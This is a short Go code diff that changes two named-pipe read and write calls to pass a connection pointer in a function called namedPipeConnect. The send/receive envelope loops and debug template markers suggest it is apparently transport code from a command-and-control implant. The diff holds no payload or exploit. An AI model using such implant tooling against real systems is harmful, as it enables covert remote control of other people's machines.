@@ -465,14 +465,14 @@ func namedPipeConnect(uri *url.URL) (*Connection, error) {
 			// {{if .Debug}}
 			log.Printf("[namedpipe] send loop envelope type %d\n", envelope.Type)
 			// {{end}}
-			namedPipeWriteEnvelope(conn, envelope)
+			namedPipeWriteEnvelope(&conn, envelope)
 		}
 	}()
 
 	go func() {
 		defer connection.Cleanup()
 		for {
-			envelope, err := namedPipeReadEnvelope(conn)
+			envelope, err := namedPipeReadEnvelope(&conn)
 			if err == io.EOF {
 				break
 			}
